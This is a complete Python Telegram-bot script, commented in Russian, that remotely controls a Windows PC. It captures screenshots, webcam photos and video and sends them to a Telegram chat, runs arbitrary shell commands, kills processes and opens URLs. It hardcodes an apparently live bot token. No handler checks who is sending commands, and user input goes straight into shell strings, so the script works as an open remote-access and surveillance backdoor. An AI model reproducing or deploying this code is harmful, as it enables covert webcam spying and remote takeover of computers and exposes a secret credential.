import telebot
import psutil
import platform
import subprocess
import cv2
import pyautogui
import os
import time

# 🔑 Вставь сюда свой НОВЫЙ токен от BotFather
TOKEN = "7226259675:AAFoRNJYdsrJ_IxpSfjjc_mkKqaJqKJ3jb0"
bot = telebot.TeleBot(TOKEN)

# 📋 Список команд
COMMANDS = """
Доступные команды:
/start - список команд
/info - информация о системе
/screenshot - сделать скриншот
/photo - фото с вебки
/video - видео с вебки (5 сек)
/run <файл> - запустить программу
/stop <имя процесса> - завершить процесс
/open_url <ссылка> - открыть сайт
"""

# 🟢 /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, COMMANDS)

# 🖥 Системная информация
@bot.message_handler(commands=['info'])
def sys_info(message):
    uname = platform.uname()
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    info = f"""
💻 Система: {uname.system} {uname.release}
🖥 Процессор: {uname.processor}
⚡ CPU: {cpu}%
📊 RAM: {ram}%
💾 Диск: {disk}%
"""
    bot.send_message(message.chat.id, info)

# 📸 Скриншот
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    screenshot = pyautogui.screenshot()
    file_path = "screenshot.png"
    screenshot.save(file_path)
    with open(file_path, 'rb') as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove(file_path)

# 📷 Фото с вебки
@bot.message_handler(commands=['photo'])
def photo(message):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    file_path = "photo.png"
    if ret:
        cv2.imwrite(file_path, frame)
        with open(file_path, 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove(file_path)
    cam.release()

# 🎥 Видео с вебки
@bot.message_handler(commands=['video'])
def video(message):
    cam = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('video.avi', fourcc, 20.0, (640,480))
    start_time = time.time()

    while(int(time.time() - start_time) < 5):
        ret, frame = cam.read()
        if ret:
            out.write(frame)
        else:
            break

    cam.release()
    out.release()

    with open("video.avi", 'rb') as vid:
        bot.send_video(message.chat.id, vid)
    os.remove("video.avi")

# 🚀 Запуск программ
@bot.message_handler(commands=['run'])
def run_file(message):
    try:
        file = message.text.split(" ", 1)[1]
        subprocess.Popen(file, shell=True)
        bot.send_message(message.chat.id, f"✅ Запустил: {file}")
    except:
        bot.send_message(message.chat.id, "⚠ Ошибка запуска")

# ❌ Остановка процессов
@bot.message_handler(commands=['stop'])
def stop_process(message):
    try:
        proc = message.text.split(" ", 1)[1]
        subprocess.call(f"taskkill /f /im {proc}.exe", shell=True)
        bot.send_message(message.chat.id, f"🛑 Процесс {proc} завершён")
    except:
        bot.send_message(message.chat.id, "⚠ Ошибка")

# 🌐 Открыть сайт
@bot.message_handler(commands=['open_url'])
def open_url(message):
    try:
        url = message.text.split(" ", 1)[1]
        subprocess.Popen(f'start {url}', shell=True)
        bot.send_message(message.chat.id, f"🌍 Открыл сайт: {url}")
    except:
        bot.send_message(message.chat.id, "⚠ Ошибка")

print("🤖 Бот запущен...")
bot.polling()
